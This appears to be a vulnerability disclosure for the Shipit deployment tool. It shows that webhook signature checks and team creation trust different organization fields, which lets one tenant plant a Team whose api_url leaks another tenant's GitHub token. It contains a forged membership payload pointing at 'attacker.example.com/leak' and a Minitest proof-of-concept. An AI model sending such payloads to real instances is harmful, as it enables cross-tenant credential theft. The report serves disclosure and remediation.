### Title
Signature verification trusts `repository.owner.login` while `MembershipHandler#find_or_create_team!` trusts the unrelated `organization.login` field, letting a webhook signed by Org B create a `Team` tagged with Org A's name and an attacker-controlled `api_url` - (File: `app/controllers/shipit/webhooks_controller.rb`, `app/models/shipit/webhooks/handlers/membership_handler.rb`, `app/models/shipit/team.rb`)

### Summary
`WebhooksController#verify_signature` derives the tenant identity used to pick the HMAC secret from `params.dig('repository','owner','login')` (falling back to `params.dig('organization','login')` only when `repository` is absent), while `MembershipHandler#find_or_create_team!` independently trusts `params.organization.login` to populate `Team#organization` and `Team#api_url`. Because the attacker fully controls the raw JSON body they sign with their own onboarded org's `webhook_secret`, they can include a `repository.owner.login` that matches their own org (so the signature check passes) together with an `organization.login` and arbitrary `team.url`/`team.id` referencing another tenant. This creates a `Team` row whose `organization` is the victim tenant's name but whose `api_url` is attacker-controlled, so a later `Team#refresh_members!` call issues the victim tenant's `Shipit.github(organization: "victim").api` GET request (with that tenant's GitHub token) against the attacker's URL.

### Finding Description
The broken binding, stated as an equality that the code implicitly assumes but does not enforce:

`repository_owner (params.dig('repository','owner','login') || params.dig('organization','login'))` used in `verify_signature` **should always equal** `params.organization.login` used in `find_or_create_team!` — but nothing enforces this.

Trace:
1. `app/controllers/shipit/webhooks_controller.rb:24-30` — `verify_signature` computes `repository_owner` from `params.dig('repository','owner','login')`, falling back to `params.dig('organization','login')` only if the `repository` key is missing: [1](#0-0) [2](#0-1) 

2. It then loads the GitHub App config for that `repository_owner` and verifies the signature against that org's `webhook_secret`: [3](#0-2) 

3. `MembershipHandler#process` / `find_or_create_team!` never look at `repository_owner` at all — they only use `params.team.id` and `params.organization.login`: [4](#0-3) 

4. `Team#refresh_members!` later trusts the persisted `organization` and `api_url` columns to make an authenticated GitHub API call: [5](#0-4) 

Exploit flow: the attacker owns Org B, which is legitimately onboarded to the multi-tenant Shipit instance (they know their own `webhook_secret`). They POST to `/webhooks` with header `X-Github-Event: membership` and a body they fully construct:
```json
{
  "action": "added",
  "team": { "id": 999999, "name": "x", "slug": "x", "url": "https://attacker.example.com/leak" },
  "organization": { "login": "orgA" },
  "member": { "login": "attacker" },
  "repository": { "owner": { "login": "orgB" } }
}
```
They sign the raw body with Org B's real `webhook_secret` and set `X-Hub-Signature` accordingly. `verify_signature` reads `repository.owner.login` = `"orgB"`, resolves Org B's `GitHubApp`, and the signature matches — verification passes. `find_or_create_team!` then runs `Team.find_or_create_by!(github_id: 999999) { |team| team.organization = "orgA"; team.api_url = "https://attacker.example.com/leak" }`, creating a `Team` row tagged as belonging to `orgA` but pointed at an attacker URL.

None of the existing guards catch this: `verify_signature` only validates that *some* onboarded org's secret matches the payload, it does not check that the org used for verification matches the org referenced by other payload fields; the `ExplicitParameters` schema on `MembershipHandler` only requires `organization.login` be a `String`, with no cross-field consistency check against `repository_owner`; there is no model validation on `Team#api_url` restricting it to `github.com`/the org's actual domain.

### Impact Explanation
This is a cross-tenant credential/context confusion: whenever the resulting `Team` (whose `organization` string equals another tenant's org name but whose `api_url`/`github_id` are attacker-chosen) is later refreshed via `Team#refresh_members!` (invoked, per the codebase, from `lib/tasks/teams.rake`), Shipit resolves `Shipit.github(organization: "orgA").api` — i.e., it authenticates using the **victim tenant's** GitHub App/token context — and then performs `github_api.get(api_url)` against the **attacker-controlled** URL. The attacker's server receives the outbound authenticated GitHub API request, which carries the victim tenant's OAuth/App token in the `Authorization` header, exfiltrating that tenant's `GITHUB_TOKEN` context. Any attacker that owns one onboarded org in the multi-tenant instance can target any other onboarded org by name (org names are public), and repeat this for every membership event they choose to forge, across arbitrary victim tenants sharing the instance.

### Likelihood Explanation
Preconditions: the Shipit instance must be multi-tenant (`Shipit#github_app_config` supporting several orgs, as stated in the question) and the attacker's own org must be one of the onboarded tenants — a legitimate, low-cost precondition since the attacker only needs to control a repo/org they already own and get it onboarded (or already be onboarded as a normal customer/tenant of the instance). No Shipit secrets, sessions, or GitHub organization membership of the victim are required; the attacker only signs with their own real `webhook_secret`. The only external dependency is that `Team#refresh_members!` actually gets invoked (currently only from a rake task, not automatically from the webhook flow itself) — this affects how the credential is eventually exfiltrated but does not affect the ability to plant the poisoned `Team` row, which is fully attacker-controlled and repeatable per request.

### Recommendation
In `WebhooksController#verify_signature`, and in every webhook handler that trusts an `organization`/`repository` field to set authorization-relevant model attributes (like `MembershipHandler#find_or_create_team!`), derive the tenant identity from a single canonical source and enforce that any other org-identifying field in the same payload is consistent with it (reject the request if `params.dig('repository','owner','login')` and `params.dig('organization','login')` disagree). Additionally, add a model validation on `Team#api_url` (and any other GitHub URL columns) that constrains it to the expected GitHub host/organization, so `refresh_members!` cannot be steered to an arbitrary attacker-controlled endpoint even if a mismatched `Team` row is somehow created.

### Proof of Concept
Minitest plan (in `test/controllers/webhooks_controller_test.rb` and `test/models/team_test.rb`, referencing existing fixtures/patterns already in the file):

```ruby
test ":membership signed by org B cannot create a Team tagged with org A" do
  @request.headers['X-Github-Event'] = 'membership'
  body = {
    action: 'added',
    team: { id: 424242, name: 'x', slug: 'x', url: 'https://attacker.example.com/leak' },
    organization: { login: 'shopify' },        # victim org name
    member: { login: 'attacker' },
    repository: { owner: { login: 'cyclimse' } } # attacker's own onboarded org, used for signing
  }.to_json

  signature = "sha1=#{OpenSSL::HMAC.hexdigest('sha1', cyclimse_webhook_secret, body)}"
  @request.headers['X-Hub-Signature'] = signature

  assert_no_difference -> { Shipit::Team.where(organization: 'shopify').count } do
    post :create, body:, as: :json
  end

  # Binding under test:
  # LHS: repository_owner used for signature verification == "cyclimse"
  # RHS: params.organization.login used for Team#organization == "shopify"
  # These MUST be equal for the write to be authorized; assert the write did not happen
  # when they diverge, i.e. no Team with organization: "shopify" and attacker-controlled api_url exists.
  refute Shipit::Team.exists?(github_id: 424242, organization: 'shopify')
end
```

This test would currently fail (the mismatched `Team` row gets created) unless `verify_signature`/`find_or_create_team!` are patched to enforce the equality above, confirming the vulnerability.

    def verify_webhook_signature(signature, message)
      return true unless webhook_secret

      algorithm, signature = signature.split("=", 2)
      return false unless algorithm == 'sha1'

      SecureCompare.secure_compare(signature, OpenSSL::HMAC.hexdigest(algorithm, webhook_secret, message))
    end
